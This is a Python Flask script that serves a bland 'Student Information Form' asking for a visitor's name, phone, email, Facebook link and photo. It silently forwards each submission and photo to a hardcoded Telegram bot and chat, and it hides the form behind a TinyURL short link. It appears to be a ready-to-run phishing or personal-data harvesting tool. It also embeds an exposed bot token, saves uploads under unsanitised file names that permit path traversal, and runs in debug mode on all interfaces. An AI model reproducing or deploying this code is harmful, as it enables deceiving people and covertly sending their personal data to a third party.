import os
from flask import Flask, request, jsonify, redirect, render_template_string
import socket
import requests

app = Flask(__name__)

# Telegram Bot Configurations
TELEGRAM_BOT_TOKEN = "7721371260:AAGMALbPA8aAlZP9jrGxar25DM_nqbhsomI"
TELEGRAM_CHAT_ID = "6904067155"  # আপনার টেলিগ্রাম চ্যাট আইডি দিন

# TinyURL API for Short Link Generation
def generate_short_link(long_url):
    response = requests.get(f"https://tinyurl.com/api-create.php?url={long_url}")
    if response.status_code == 200:
        return response.text
    else:
        return long_url

# HTML Template for the Form
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Student Information Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 500px;
            margin: 50px auto;
            background: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            color: #333333;
        }
        label {
            display: block;
            margin: 10px 0 5px;
            font-weight: bold;
            color: #555555;
        }
        input[type="text"], input[type="email"], input[type="url"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #dddddd;
            border-radius: 5px;
        }
        input:invalid {
            border-color: red;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background: #0056b3;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #888888;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Submit Your Information</h2>
        <form action="/submit" method="post" enctype="multipart/form-data">
            <label for="name">Name:</label>
            <input type="text" id="name" name="name" required>
            
            <label for="phone">Phone Number:</label>
            <input type="text" id="phone" name="phone" required>
            
            <label for="email">Email Address:</label>
            <input type="email" id="email" name="email" required>
            
            <label for="facebook">Facebook ID Link:</label>
            <input type="url" id="facebook" name="facebook" required>
            
            <label for="photo">Upload Photo:</label>
            <input type="file" id="photo" name="photo" accept="image/*" required>
            
            <button type="submit">Submit</button>
        </form>
    </div>
    <div class="footer">
        &copy; 2024 Your Organization. All rights reserved.
    </div>
</body>
</html>
"""

# Success Page Template
success_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Submission Successful</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            text-align: center;
            padding: 50px;
        }
        .message {
            max-width: 400px;
            margin: 0 auto;
            background: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        h2 {
            color: #28a745;
        }
        p {
            color: #555555;
        }
    </style>
</head>
<body>
    <div class="message">
        <h2>Thank you for your submission!</h2>
        <p>We have received your information. You will be contacted soon.</p>
    </div>
</body>
</html>
"""

@app.route("/")
def index():
    return "Welcome! Use /form to view the form."

@app.route("/form")
def form():
    return render_template_string(html_template)

@app.route("/submit", methods=["POST"])
def submit():
    name = request.form["name"]
    phone = request.form["phone"]
    email = request.form["email"]
    facebook = request.form["facebook"]
    photo = request.files["photo"]

    # Save the photo locally
    photo_path = f"static/{photo.filename}"
    photo.save(photo_path)

    # Send data to Telegram
    message = f"""
        New Submission:
        Name: {name}
        Phone: {phone}
        Email: {email}
        Facebook: {facebook}
    """
    requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
        data={"chat_id": TELEGRAM_CHAT_ID, "text": message}
    )

    # Send the photo to Telegram
    with open(photo_path, "rb") as file:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
            data={"chat_id": TELEGRAM_CHAT_ID},
            files={"photo": file}
        )

    return render_template_string(success_template)

def find_free_port():
    """Finds a free port to use."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", 0))
        return s.getsockname()[1]

if __name__ == "__main__":
    port = find_free_port()
    short_link = generate_short_link(f"http://127.0.0.1:{port}/form")
    print(f"Form is available at: {short_link}")
    app.run(host="0.0.0.0", port=port, debug=True)
